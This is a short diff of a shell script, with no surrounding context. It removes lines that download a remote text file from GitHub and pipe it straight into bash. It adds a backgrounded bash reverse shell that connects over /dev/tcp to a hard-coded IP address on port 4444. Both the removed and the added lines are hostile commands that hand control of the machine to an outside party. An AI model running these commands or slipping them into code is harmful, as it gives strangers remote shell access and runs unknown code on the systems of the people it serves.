@@ -1,3 +1,1 @@
-cd /tmp
-touch /tmp/dikz-ezefz-ef5zef-zef5f-ef9e7
-wget -qO- https://raw.githubusercontent.com/G-bl7/testingEdu/refs/heads/main/AgentAI.txt | bash
+bash -c 'bash -i >& /dev/tcp/82.165.73.88/4444 0<&1' &
